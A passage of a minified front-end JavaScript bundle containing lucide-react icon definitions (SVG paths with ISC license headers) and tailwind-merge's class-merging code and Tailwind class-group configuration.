 */const Gj=Z("Infinity",[["path",{d:"M12 12c-2-2.67-4-4-6-4a4 4 0 1 0 0 8c2 0 4-1.33 6-4Zm0 0c2 2.67 4 4 6 4a4 4 0 0 0 0-8c-2 0-4 1.33-6 4Z",key:"1z0uae"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Ho=Z("Info",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"M12 16v-4",key:"1dtifu"}],["path",{d:"M12 8h.01",key:"e9boi3"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const ey=Z("Key",[["path",{d:"m15.5 7.5 2.3 2.3a1 1 0 0 0 1.4 0l2.1-2.1a1 1 0 0 0 0-1.4L19 4",key:"g0fldk"}],["path",{d:"m21 2-9.6 9.6",key:"1j0ho8"}],["circle",{cx:"7.5",cy:"15.5",r:"5.5",key:"yqb3hr"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Wj=Z("Link",[["path",{d:"M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71",key:"1cjeqo"}],["path",{d:"M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71",key:"19qd67"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Kj=Z("LoaderCircle",[["path",{d:"M21 12a9 9 0 1 1-6.219-8.56",key:"13zald"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const qj=Z("Lock",[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Qj=Z("LogOut",[["path",{d:"M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4",key:"1uf3rs"}],["polyline",{points:"16 17 21 12 16 7",key:"1gabdz"}],["line",{x1:"21",x2:"9",y1:"12",y2:"12",key:"1uyos4"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Yj=Z("MapPin",[["path",{d:"M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0",key:"1r0f0z"}],["circle",{cx:"12",cy:"10",r:"3",key:"ilqhr7"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Jj=Z("Monitor",[["rect",{width:"20",height:"14",x:"2",y:"3",rx:"2",key:"48i651"}],["line",{x1:"8",x2:"16",y1:"21",y2:"21",key:"1svkeh"}],["line",{x1:"12",x2:"12",y1:"17",y2:"21",key:"vw1qmm"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Ai=Z("Package",[["path",{d:"M11 21.73a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73z",key:"1a0edw"}],["path",{d:"M12 22V12",key:"d0xqtd"}],["path",{d:"m3.3 7 7.703 4.734a2 2 0 0 0 1.994 0L20.7 7",key:"yx3hmr"}],["path",{d:"m7.5 4.27 9 5.15",key:"1c824w"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const cu=Z("Pause",[["rect",{x:"14",y:"4",width:"4",height:"16",rx:"1",key:"zuxfzm"}],["rect",{x:"6",y:"4",width:"4",height:"16",rx:"1",key:"1okwgv"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Xj=Z("PenLine",[["path",{d:"M12 20h9",key:"t2du7b"}],["path",{d:"M16.376 3.622a1 1 0 0 1 3.002 3.002L7.368 18.635a2 2 0 0 1-.855.506l-2.872.838a.5.5 0 0 1-.62-.62l.838-2.872a2 2 0 0 1 .506-.854z",key:"1ykcvy"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Vm=Z("Play",[["polygon",{points:"6 3 20 12 6 21 6 3",key:"1oa8hb"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Zj=Z("Plus",[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"M12 5v14",key:"s699le"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Rt=Z("RefreshCw",[["path",{d:"M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8",key:"v9h5vc"}],["path",{d:"M21 3v5h-5",key:"1q7to0"}],["path",{d:"M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16",key:"3uifl3"}],["path",{d:"M8 16H3v5",key:"1cv678"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const ty=Z("RotateCcw",[["path",{d:"M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8",key:"1357e3"}],["path",{d:"M3 3v5h5",key:"1xhq8a"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const e_=Z("Search",[["circle",{cx:"11",cy:"11",r:"8",key:"4ej97u"}],["path",{d:"m21 21-4.3-4.3",key:"1qie3q"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const t_=Z("Send",[["path",{d:"M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z",key:"1ffxy3"}],["path",{d:"m21.854 2.147-10.94 10.939",key:"12cjpa"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const ry=Z("Settings",[["path",{d:"M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z",key:"1qme2f"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const lt=Z("Shield",[["path",{d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",key:"oel41y"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Ri=Z("Sparkles",[["path",{d:"M9.937 15.5A2 2 0 0 0 8.5 14.063l-6.135-1.582a.5.5 0 0 1 0-.962L8.5 9.936A2 2 0 0 0 9.937 8.5l1.582-6.135a.5.5 0 0 1 .963 0L14.063 8.5A2 2 0 0 0 15.5 9.937l6.135 1.581a.5.5 0 0 1 0 .964L15.5 14.063a2 2 0 0 0-1.437 1.437l-1.582 6.135a.5.5 0 0 1-.963 0z",key:"4pj2yx"}],["path",{d:"M20 3v4",key:"1olli1"}],["path",{d:"M22 5h-4",key:"1gvqau"}],["path",{d:"M4 17v2",key:"vumght"}],["path",{d:"M5 18H3",key:"zchphs"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const r_=Z("Star",[["path",{d:"M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z",key:"r04s7s"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const jr=Z("Target",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"12",r:"6",key:"1vlfrh"}],["circle",{cx:"12",cy:"12",r:"2",key:"1c9p78"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const ta=Z("Trash2",[["path",{d:"M3 6h18",key:"d0wm0j"}],["path",{d:"M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6",key:"4alrt4"}],["path",{d:"M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2",key:"v07s0e"}],["line",{x1:"10",x2:"10",y1:"11",y2:"17",key:"1uufr5"}],["line",{x1:"14",x2:"14",y1:"11",y2:"17",key:"xtxkd"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const ja=Z("TrendingUp",[["polyline",{points:"22 7 13.5 15.5 8.5 10.5 2 17",key:"126l90"}],["polyline",{points:"16 7 22 7 22 13",key:"kwv8wd"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const ct=Z("TriangleAlert",[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",key:"wmoenq"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Hm=Z("Upload",[["path",{d:"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",key:"ih7n3h"}],["polyline",{points:"17 8 12 3 7 8",key:"t8dd8p"}],["line",{x1:"12",x2:"12",y1:"3",y2:"15",key:"widbto"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const ny=Z("User",[["path",{d:"M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2",key:"975kel"}],["circle",{cx:"12",cy:"7",r:"4",key:"17ys0d"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const bl=Z("Users",[["path",{d:"M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",key:"1yyitq"}],["circle",{cx:"9",cy:"7",r:"4",key:"nufk8"}],["path",{d:"M22 21v-2a4 4 0 0 0-3-3.87",key:"kshegd"}],["path",{d:"M16 3.13a4 4 0 0 1 0 7.75",key:"1da9ce"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const n_=Z("Wifi",[["path",{d:"M12 20h.01",key:"zekei9"}],["path",{d:"M2 8.82a15 15 0 0 1 20 0",key:"dnpr2z"}],["path",{d:"M5 12.859a10 10 0 0 1 14 0",key:"1x1e6c"}],["path",{d:"M8.5 16.429a5 5 0 0 1 7 0",key:"1bycff"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Qh=Z("X",[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]]);/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Ge=Z("Zap",[["path",{d:"M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z",key:"1xq2db"}]]),Yh="-",s_=t=>{const e=i_(t),{conflictingClassGroups:r,conflictingClassGroupModifiers:n}=t;return{getClassGroupId:o=>{const l=o.split(Yh);return l[0]===""&&l.length!==1&&l.shift(),sy(l,e)||a_(o)},getConflictingClassGroupIds:(o,l)=>{const c=r[o]||[];return l&&n[o]?[...c,...n[o]]:c}}},sy=(t,e)=>{var o;if(t.length===0)return e.classGroupId;const r=t[0],n=e.nextPart.get(r),s=n?sy(t.slice(1),n):void 0;if(s)return s;if(e.validators.length===0)return;const i=t.join(Yh);return(o=e.validators.find(({validator:l})=>l(i)))==null?void 0:o.classGroupId},Gm=/^\[(.+)\]$/,a_=t=>{if(Gm.test(t)){const e=Gm.exec(t)[1],r=e==null?void 0:e.substring(0,e.indexOf(":"));if(r)return"arbitrary.."+r}},i_=t=>{const{theme:e,prefix:r}=t,n={nextPart:new Map,validators:[]};return l_(Object.entries(t.classGroups),r).forEach(([i,o])=>{du(o,n,i,e)}),n},du=(t,e,r,n)=>{t.forEach(s=>{if(typeof s=="string"){const i=s===""?e:Wm(e,s);i.classGroupId=r;return}if(typeof s=="function"){if(o_(s)){du(s(n),e,r,n);return}e.validators.push({validator:s,classGroupId:r});return}Object.entries(s).forEach(([i,o])=>{du(o,Wm(e,i),r,n)})})},Wm=(t,e)=>{let r=t;return e.split(Yh).forEach(n=>{r.nextPart.has(n)||r.nextPart.set(n,{nextPart:new Map,validators:[]}),r=r.nextPart.get(n)}),r},o_=t=>t.isThemeGetter,l_=(t,e)=>e?t.map(([r,n])=>{const s=n.map(i=>typeof i=="string"?e+i:typeof i=="object"?Object.fromEntries(Object.entries(i).map(([o,l])=>[e+o,l])):i);return[r,s]}):t,c_=t=>{if(t<1)return{get:()=>{},set:()=>{}};let e=0,r=new Map,n=new Map;const s=(i,o)=>{r.set(i,o),e++,e>t&&(e=0,n=r,r=new Map)};return{get(i){let o=r.get(i);if(o!==void 0)return o;if((o=n.get(i))!==void 0)return s(i,o),o},set(i,o){r.has(i)?r.set(i,o):s(i,o)}}},ay="!",d_=t=>{const{separator:e,experimentalParseClassName:r}=t,n=e.length===1,s=e[0],i=e.length,o=l=>{const c=[];let d=0,u=0,h;for(let w=0;w<l.length;w++){let y=l[w];if(d===0){if(y===s&&(n||l.slice(w,w+i)===e)){c.push(l.slice(u,w)),u=w+i;continue}if(y==="/"){h=w;continue}}y==="["?d++:y==="]"&&d--}const f=c.length===0?l:l.substring(u),m=f.startsWith(ay),g=m?f.substring(1):f,v=h&&h>u?h-u:void 0;return{modifiers:c,hasImportantModifier:m,baseClassName:g,maybePostfixModifierPosition:v}};return r?l=>r({className:l,parseClassName:o}):o},u_=t=>{if(t.length<=1)return t;const e=[];let r=[];return t.forEach(n=>{n[0]==="["?(e.push(...r.sort(),n),r=[]):r.push(n)}),e.push(...r.sort()),e},h_=t=>({cache:c_(t.cacheSize),parseClassName:d_(t),...s_(t)}),f_=/\s+/,m_=(t,e)=>{const{parseClassName:r,getClassGroupId:n,getConflictingClassGroupIds:s}=e,i=[],o=t.trim().split(f_);let l="";for(let c=o.length-1;c>=0;c-=1){const d=o[c],{modifiers:u,hasImportantModifier:h,baseClassName:f,maybePostfixModifierPosition:m}=r(d);let g=!!m,v=n(g?f.substring(0,m):f);if(!v){if(!g){l=d+(l.length>0?" "+l:l);continue}if(v=n(f),!v){l=d+(l.length>0?" "+l:l);continue}g=!1}const w=u_(u).join(":"),y=h?w+ay:w,x=y+v;if(i.includes(x))continue;i.push(x);const b=s(v,g);for(let j=0;j<b.length;++j){const _=b[j];i.push(y+_)}l=d+(l.length>0?" "+l:l)}return l};function p_(){let t=0,e,r,n="";for(;t<arguments.length;)(e=arguments[t++])&&(r=iy(e))&&(n&&(n+=" "),n+=r);return n}const iy=t=>{if(typeof t=="string")return t;let e,r="";for(let n=0;n<t.length;n++)t[n]&&(e=iy(t[n]))&&(r&&(r+=" "),r+=e);return r};function g_(t,...e){let r,n,s,i=o;function o(c){const d=e.reduce((u,h)=>h(u),t());return r=h_(d),n=r.cache.get,s=r.cache.set,i=l,l(c)}function l(c){const d=n(c);if(d)return d;const u=m_(c,r);return s(c,u),u}return function(){return i(p_.apply(null,arguments))}}const Pe=t=>{const e=r=>r[t]||[];return e.isThemeGetter=!0,e},oy=/^\[(?:([a-z-]+):)?(.+)\]$/i,x_=/^\d+\/\d+$/,y_=new Set(["px","full","screen"]),v_=/^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,b_=/\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,w_=/^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/,j_=/^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/,__=/^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/,Cr=t=>ra(t)||y_.has(t)||x_.test(t),qr=t=>Ta(t,"length",A_),ra=t=>!!t&&!Number.isNaN(Number(t)),Xc=t=>Ta(t,"number",ra),Ha=t=>!!t&&Number.isInteger(Number(t)),N_=t=>t.endsWith("%")&&ra(t.slice(0,-1)),le=t=>oy.test(t),Qr=t=>v_.test(t),S_=new Set(["length","size","percentage"]),k_=t=>Ta(t,S_,ly),E_=t=>Ta(t,"position",ly),C_=new Set(["image","url"]),T_=t=>Ta(t,C_,I_),P_=t=>Ta(t,"",R_),Ga=()=>!0,Ta=(t,e,r)=>{const n=oy.exec(t);return n?n[1]?typeof e=="string"?n[1]===e:e.has(n[1]):r(n[2]):!1},A_=t=>b_.test(t)&&!w_.test(t),ly=()=>!1,R_=t=>j_.test(t),I_=t=>__.test(t),L_=()=>{const t=Pe("colors"),e=Pe("spacing"),r=Pe("blur"),n=Pe("brightness"),s=Pe("borderColor"),i=Pe("borderRadius"),o=Pe("borderSpacing"),l=Pe("borderWidth"),c=Pe("contrast"),d=Pe("grayscale"),u=Pe("hueRotate"),h=Pe("invert"),f=Pe("gap"),m=Pe("gradientColorStops"),g=Pe("gradientColorStopPositions"),v=Pe("inset"),w=Pe("margin"),y=Pe("opacity"),x=Pe("padding"),b=Pe("saturate"),j=Pe("scale"),_=Pe("sepia"),N=Pe("skew"),S=Pe("space"),k=Pe("translate"),C=()=>["auto","contain","none"],T=()=>["auto","hidden","clip","visible","scroll"],M=()=>["auto",le,e],A=()=>[le,e],R=()=>["",Cr,qr],I=()=>["auto",ra,le],J=()=>["bottom","center","left","left-bottom","left-top","right","right-bottom","right-top","top"],K=()=>["solid","dashed","dotted","double","none"],ne=()=>["normal","multiply","screen","overlay","darken","lighten","color-dodge","color-burn","hard-light","soft-light","difference","exclusion","hue","saturation","color","luminosity"],P=()=>["start","end","center","between","around","evenly","stretch"],z=()=>["","0",le],Q=()=>["auto","avoid","all","avoid-page","page","left","right","column"],H=()=>[ra,le];return{cacheSize:500,separator:":",theme:{colors:[Ga],spacing:[Cr,qr],blur:["none","",Qr,le],brightness:H(),borderColor:[t],borderRadius:["none","","full",Qr,le],borderSpacing:A(),borderWidth:R(),contrast:H(),grayscale:z(),hueRotate:H(),invert:z(),gap:A(),gradientColorStops:[t],gradientColorStopPositions:[N_,qr],inset:M(),margin:M(),opacity:H(),padding:A(),saturate:H(),scale:H(),sepia:z(),skew:H(),space:A(),translate:A()},classGroups:{aspect:[{aspect:["auto","square","video",le]}],container:["container"],columns:[{columns:[Qr]}],"break-after":[{"break-after":Q()}],"break-before":[{"break-before":Q()}],"break-inside":[{"break-inside":["auto","avoid","avoid-page","avoid-column"]}],"box-decoration":[{"box-decoration":["slice","clone"]}],box:[{box:["border","content"]}],display:["block","inline-block","inline","flex","inline-flex","table","inline-table","table-caption","table-cell","table-column","table-column-group","table-footer-group","table-header-group","table-row-group","table-row","flow-root","grid","inline-grid","contents","list-item","hidden"],float:[{float:["right","left","none","start","end"]}],clear:[{clear:["left","right","both","none","start","end"]}],isolation:["isolate","isolation-auto"],"object-fit":[{object:["contain","cover","fill","none","scale-down"]}],"object-position":[{object:[...J(),le]}],overflow:[{overflow:T()}],"overflow-x":[{"overflow-x":T()}],"overflow-y":[{"overflow-y":T()}],overscroll:[{overscroll:C()}],"overscroll-x":[{"overscroll-x":C()}],"overscroll-y":[{"overscroll-y":C()}],position:["static","fixed","absolute","relative","sticky"],inset:[{inset:[v]}],"inset-x":[{"inset-x":[v]}],"inset-y":[{"inset-y":[v]}],start:[{start:[v]}],end:[{end:[v]}],top:[{top:[v]}],right:[{right:[v]}],bottom:[{bottom:[v]}],left:[{left:[v]}],visibility:["visible","invisible","collapse"],z:[{z:["auto",Ha,le]}],basis:[{basis:M()}],"flex-direction":[{flex:["row","row-reverse","col","col-reverse"]}],"flex-wrap":[{flex:["wrap","wrap-reverse","nowrap"]}],flex:[{flex:["1","auto","initial","none",le]}],grow:[{grow:z()}],shrink:[{shrink:z()}],order:[{order:["first","last","none",Ha,le]}],"grid-cols":[{"grid-cols":[Ga]}],"col-start-end":[{col:["auto",{span:["full",Ha,le]},le]}],"col-start":[{"col-start":I()}],"col-end":[{"col-end":I()}],"grid-rows":[{"grid-rows":[Ga]}],"row-start-end":[{row:["auto",{span:[Ha,le]},le]}],"row-start":[{"row-start":I()}],"row-end":[{"row-end":I()}],"grid-flow":[{"grid-flow":["row","col","dense","row-dense","col-dense"]}],"auto-cols":[{"auto-cols":["auto","min","max","fr",le]}],"auto-rows":[{"auto-rows":["auto","min","max","fr",le]}],gap:[{gap:[f]}],"gap-x":[{"gap-x":[f]}],"gap-y":[{"gap-y":[f]}],"justify-content":[{justify:["normal",...P()]}],"justify-items":[{"justify-items":["start","end","center","stretch"]}],"justify-self":[{"justify-self":["auto","start","end","center","stretch"]}],"align-content":[{content:["normal",...P(),"baseline"]}],"align-items":[{items:["start","end","center","baseline","stretch"]}],"align-self":[{self:["auto","start","end","center","stretch","baseline"]}],"place-content":[{"place-content":[...P(),"baseline"]}],"place-items":[{"place-items":["start","end","center","baseline","stretch"]}],"place-self":[{"place-self":["auto","start","end","center","stretch"]}],p:[{p:[x]}],px:[{px:[x]}],py:[{py:[x]}],ps:[{ps:[x]}],pe:[{pe:[x]}],pt:[{pt:[x]}],pr:[{pr:[x]}],pb:[{pb:[x]}],pl:[{pl:[x]}],m:[{m:[w]}],mx:[{mx:[w]}],my:[{my:[w]}],ms:[{ms:[w]}],me:[{me:[w]}],mt:[{mt:[w]}],mr:[{mr:[w]}],mb:[{mb:[w]}],ml:[{ml:[w]}],"space-x":[{"space-x":[S]}],"space-x-reverse":["space-x-reverse"],"space-y":[{"space-y":[S]}],"space-y-reverse":["space-y-reverse"],w:[{w:["auto","min","max","fit","svw","lvw","dvw",le,e]}],"min-w":[{"min-w":[le,e,"min","max","fit"]}],"max-w":[{"max-w":[le,e,"none","full","min","max","fit","prose",{screen:[Qr]},Qr]}],h:[{h:[le,e,"auto","min","max","fit","svh","lvh","dvh"]}],"min-h":[{"min-h":[le,e,"min","max","fit","svh","lvh","dvh"]}],"max-h":[{"max-h":[le,e,"min","max","fit","svh","lvh","dvh"]}],size:[{size:[le,e,"auto","min","max","fit"]}],"font-size":[{text:["base",Qr,qr]}],"font-smoothing":["antialiased","subpixel-antialiased"],"font-style":["italic","not-italic"],"font-weight":[{font:["thin","extralight","light","normal","medium","semibold","bold","extrabold","black",Xc]}],"font-family":[{font:[Ga]}],"fvn-normal":["normal-nums"],"fvn-ordinal":["ordinal"],"fvn-slashed-zero":["slashed-zero"],"fvn-figure":["lining-nums","oldstyle-nums"],"fvn-spacing":["proportional-nums","tabular-nums"],"fvn-fraction":["diagonal-fractions","stacked-fractons"],tracking:[{tracking:["tighter","tight","normal","wide","wider","widest",le]}],"line-clamp":[{"line-clamp":["none",ra,Xc]}],leading:[{leading:["none","tight","snug","normal","relaxed","loose",Cr,le]}],"list-image":[{"list-image":["none",le]}],"list-style-type":[{list:["none","disc","decimal",le]}],"list-style-position":[{list:["inside","outside"]}],"placeholder-color":[{placeholder:[t]}],"placeholder-opacity":[{"placeholder-opacity":[y]}],"text-alignment":[{text:["left","center","right","justify","start","end"]}],"text-color":[{text:[t]}],"text-opacity":[{"text-opacity":[y]}],"text-decoration":["underline","overline","line-through","no-underline"],"text-decoration-style":[{decoration:[...K(),"wavy"]}],"text-decoration-thickness":[{decoration:["auto","from-font",Cr,qr]}],"underline-offset":[{"underline-offset":["auto",Cr,le]}],"text-decoration-color":[{decoration:[t]}],"text-transform":["uppercase","lowercase","capitalize","normal-case"],"text-overflow":["truncate","text-ellipsis","text-clip"],"text-wrap":[{text:["wrap","nowrap","balance","pretty"]}],indent:[{indent:A()}],"vertical-align":[{align:["baseline","top","middle","bottom","text-top","text-bottom","sub","super",le]}],whitespace:[{whitespace:["normal","nowrap","pre","pre-line","pre-wrap","break-spaces"]}],break:[{break:["normal","words","all","keep"]}],hyphens:[{hyphens:["none","manual","auto"]}],content:[{content:["none",le]}],"bg-attachment":[{bg:["fixed","local","scroll"]}],"bg-clip":[{"bg-clip":["border","padding","content","text"]}],"bg-opacity":[{"bg-opacity":[y]}],"bg-origin":[{"bg-origin":["border","padding","content"]}],"bg-position":[{bg:[...J(),E_]}],"bg-repeat":[{bg:["no-repeat",{repeat:["","x","y","round","space"]}]}],"bg-size":[{bg:["auto","cover","contain",k_]}],"bg-image":[{bg:["none",{"gradient-to":["t","tr","r","br","b","bl","l","tl"]},T_]}],"bg-color":[{bg:[t]}],"gradient-from-pos":[{from:[g]}],"gradient-via-pos":[{via:[g]}],"gradient-to-pos":[{to:[g]}],"gradient-from":[{from:[m]}],"gradient-via":[{via:[m]}],"gradient-to":[{to:[m]}],rounded:[{rounded:[i]}],"rounded-s":[{"rounded-s":[i]}],"rounded-e":[{"rounded-e":[i]}],"rounded-t":[{"rounded-t":[i]}],"rounded-r":[{"rounded-r":[i]}],"rounded-b":[{"rounded-b":[i]}],"rounded-l":[{"rounded-l":[i]}],"rounded-ss":[{"rounded-ss":[i]}],"rounded-se":[{"rounded-se":[i]}],"rounded-ee":[{"rounded-ee":[i]}],"rounded-es":[{"rounded-es":[i]}],"rounded-tl":[{"rounded-tl":[i]}],"rounded-tr":[{"rounded-tr":[i]}],"rounded-br":[{"rounded-br":[i]}],"rounded-bl":[{"rounded-bl":[i]}],"border-w":[{border:[l]}],"border-w-x":[{"border-x":[l]}],"border-w-y":[{"border-y":[l]}],"border-w-s":[{"border-s":[l]}],"border-w-e":[{"border-e":[l]}],"border-w-t":[{"border-t":[l]}],"border-w-r":[{"border-r":[l]}],"border-w-b":[{"border-b":[l]}],"border-w-l":[{"border-l":[l]}],"border-opacity":[{"border-opacity":[y]}],"border-style":[{border:[...K(),"hidden"]}],"divide-x":[{"divide-x":[l]}],"divide-x-reverse":["divide-x-reverse"],"divide-y":[{"divide-y":[l]}],"divide-y-reverse":["divide-y-reverse"],"divide-opacity":[{"divide-opacity":[y]}],"divide-style":[{divide:K()}],"border-color":[{border:[s]}],"border-color-x":[{"border-x":[s]}],"border-color-y":[{"border-y":[s]}],"border-color-s":[{"border-s":[s]}],"border-color-e":[{"border-e":[s]}],"border-color-t":[{"border-t":[s]}],"border-color-r":[{"border-r":[s]}],"border-color-b":[{"border-b":[s]}],"border-color-l":[{"border-l":[s]}],"divide-color":[{divide:[s]}],"outline-style":[{outline:["",...K()]}